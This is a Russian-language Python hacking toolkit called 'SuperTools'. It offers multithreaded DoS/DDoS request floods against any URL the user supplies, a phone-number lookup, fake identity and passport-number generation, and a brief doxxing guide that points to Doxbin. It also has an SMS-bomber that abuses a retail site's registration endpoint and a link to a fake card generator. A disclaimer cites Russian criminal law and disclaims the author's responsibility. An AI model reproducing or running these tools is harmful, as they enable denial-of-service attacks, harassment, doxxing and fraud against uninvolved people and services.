import random
import threading
import requests
import time
import os
import pyfiglet
import colorama
import webbrowser

# Создаем баннер с помощью pyfiglet
def loading_animation():
    print("Запуск софта ", end="")
    for i in range(3):
        print(".", end="", flush=True)
        time.sleep(0.5)  # Задержка для эффекта
    print("\nСофт запущен!")

def get_phone_info(api_key, phone_number):
    url = f"http://apilayer.net/api/validate?access_key={api_key}&number={phone_number}"
    response = requests.get(url)

    if response.status_code == 200:
        data = response.json()
        if data.get('valid'):
            return {
                "country": data['country_name'],
                "location": data['location'],
                "carrier": data['carrier'],
                "line_type": data['line_type'],
            }
        else:
            return "Номер телефона недействителен."
    else:
        return "Ошибка при запросе информации."

def generate_fake_data():
    fake_names = ['Сергей', 'Алексей', 'Дмитрий', 'Мария', 'Екатерина']
    fake_surnames = ['Петров', 'Сидоров', 'Кузнецов', 'Иванова', 'Смирнова']
    
    fake_name = random.choice(fake_names)
    fake_surname = random.choice(fake_surnames)
    fake_phone = f"+7{random.randint(9000000000, 9999999999)}"
    fake_passport = f"{random.randint(1000, 9999)} {random.randint(100000, 999999)}"

    return {
        'Имя': fake_name,
        'Фамилия': fake_surname,
        'Номер телефона': fake_phone,
        'Номер паспорта': fake_passport
    }

def ddos(url):
    while True:
        try:
            requests.get(url)
            print(f"Запрос отправлен на {url}")
        except requests.exceptions.RequestException as e:
            print(f"Ошибка при отправке запроса: {e}")
            break

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def dos(target):
    while True:
        try:
            res = requests.get(target)
            print(colorama.Fore.YELLOW + "Запрос отправлен!" + colorama.Fore.WHITE)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Ошибка подключения!")

def open_link(url):
    webbrowser.open(url)  # Открываем указанную ссылку в браузере

def main_menu(api_key):
    while True:
        banner = pyfiglet.figlet_format("SuperTools")
        print(banner)
        print("1. Поиск информации по номеру телефона")
        print("2. Сгенерировать фейковые данные")
        print("3. Мануал по доксу")
        print("4. DDoS")
        print("5. SMS Bomber (Не работает)")
        print("6. Information")
        print("7. Очистить экран")
        print("8. DoS")
        print("9. Generator fake cards")
        
        choice = input("Выберите вариант: ")

        if choice == '1':
            phone_number = input("Введите номер телефона (в международном формате): ")
            info = get_phone_info(api_key, phone_number)
            print(info)

        elif choice == '2':
            fake_data = generate_fake_data()
            print("Фейковые данные:")
            for key, value in fake_data.items():
                print(f"{key}: {value}")

        elif choice == '3':
            print("Мануал по доксу: 1. ищешь все данные 2. Заходишь на сайт Doxbin.com 3. Создаешь пасту с данными.")

        elif choice == '4':
            url = input('Введите URL для DDoS-атаки: ')
            thrnum = int(input('Введите количество потоков: '))
            threads = []

            print('DDoS is running...')
            for i in range(thrnum):
                thr = threading.Thread(target=ddos, args=(url,))
                thr.start()
                threads.append(thr)

            for thr in threads:
                thr.join()  # Ждем завершения всех потоков

        elif choice == '5':
            phone = input('Введите номер телефона: ')
            try:
                r = requests.post("https://api.fix-price.com/buyer/v2/registration/phone/request", data={"phone": phone})
                if r.status_code == 400:
                    print('Ошибка при отправке СМС')
                elif r.status_code == 200:
                    print("СМС отправлено")
                else:
                    print('Ошибка. Код статуса:', r.status_code)
            except requests.exceptions.RequestException as e:
                print(f"Ошибка при отправке запроса: {e}")

        elif choice == '6':
            print("Информация SuperTools:\n"
                  "Новое обновление 1.5!\n"
                  "- New function Generator Fake Card\n"
                  "ПРЕДУПРЕЖДЕНИЕ!\n"
                  "ДАННЫЙ СОФТ СОДЕРЖИТ DDoS АТАКИ, DoS АТАКИ, И ПОИСК ИНФОРМАЦИИ ПО НОМЕРУ ТЕЛЕФОНА!\n"
                  "ЗАПОМНИТЕ:\n"
                  "  1. ЗА DDoS АТАКИ, И DoS АТАКИ ВЫ МОЖЕТЕ БЫТЬ ПРИВЛЕЧЕНЫ К СТАТЬЕ 272 УК РФ (За использование DDoS атак и DoS атак, автор софта не несёт ответственность)\n"
                  "  2. ЗА ДЕАНОНИЗАЦИЮ (Слив данных) ВЫ МОЖЕТЕ БЫТЬ ПРИВЛЕЧЕНЫ К СТАТЬЯМ:\n"
                  "137 УК РФ — закон о нарушении неприкосновенности частной жизни.\n"
                  "Статья 163 УК РФ — подойдет, если доксинг осуществляется с целью вымогательства.\n"
                  "Статья 272 УК РФ — наказывает за неправомерный доступ к компьютерной информации.\n"
                  "(Автор софта также не несёт ответственность)\n"
                  "ПРИ ИСПОЛЬЗОВАНИИ ДАННОГО СОФТА, ОТВЕТСТВЕННОСТЬ БУДЕТ ИМЕННО НА ВАС, А НЕ НА АВТОРА!")

        elif choice == '7':
            clear_screen()  # Вызываем функцию для очистки экрана
        
        elif choice == '8':
            url = input("Введите URL для DoS-атаки: ")
            try:
                thrnum = int(input("Введите количество потоков: "))
            except ValueError:
                print("Количество потоков указано неверно!")
                continue

            if thrnum <= 0:
                print("Количество потоков должно быть больше 0.")
                continue
            
            if not url.startswith(("http://", "https://")):
                print("Необходимо указать URL с http или https!")
                continue
            
            for i in range(thrnum):
                thr = threading.Thread(target=dos, args=(url,))
                thr.start()
            print(f"{thrnum} потоков запущено!")
        
        elif choice == '9':
            link = "https://www.vccgenerator.org/ru/"
            open_link(link)  # Вызываем функцию для открытия ссылки
        
        else:
            print("Неправильный выбор.")

if __name__ == "__main__":
    loading_animation()
    api_key = "e9ed18bb292609a81a00f1cc1ef04017"  # Замените на ваш API-ключ
    main_menu(api_key)
